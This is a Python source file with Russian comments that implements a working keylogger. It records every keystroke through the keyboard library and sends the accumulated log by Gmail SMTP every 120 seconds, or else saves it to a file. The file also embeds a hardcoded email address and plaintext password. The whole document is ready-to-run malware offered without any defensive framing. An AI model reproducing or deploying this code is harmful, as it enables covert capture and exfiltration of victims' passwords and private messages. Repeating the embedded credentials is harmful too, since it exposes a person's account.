import keyboard 
import smtplib 
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 120 #время в секундах
EMAIL_ADDRESS = "blyat.spalili@gmail.com"
EMAIL_PASSWORD = "213912Andrew"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        
        self.interval = interval
        self.report_method = report_method
        
        self.log = ""
        
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            #не символ, специальная клавиша (например, ctrl, alt и т. д.)
            #верхний регистр
            if name == "space":
                #" " вместо пробелов
                name = " "
            elif name == "enter":
                #добавлять новую строку всякий раз, когда нажимается ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #замените пробелы символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name
    def update_filename(self):
        #создать имя файла, которое будет идентифицировано по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # создать файл
        with open(f"{self.filename}.txt", "w") as f:
            # записать лог
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # управляет подключением к SMTP-серверу
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # подключиться к SMTP-серверу в режиме TLS
        server.starttls()
        # логин
        server.login(email, password)
        # отправить сообщение
        server.sendmail(email, email, message)
        # завершает сеанс
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            # обновить `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # старт
        timer.start()
    
    def start(self):
        #записать дату и время начала
        self.start_dt = datetime.now()
        #запустить кейлогер
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()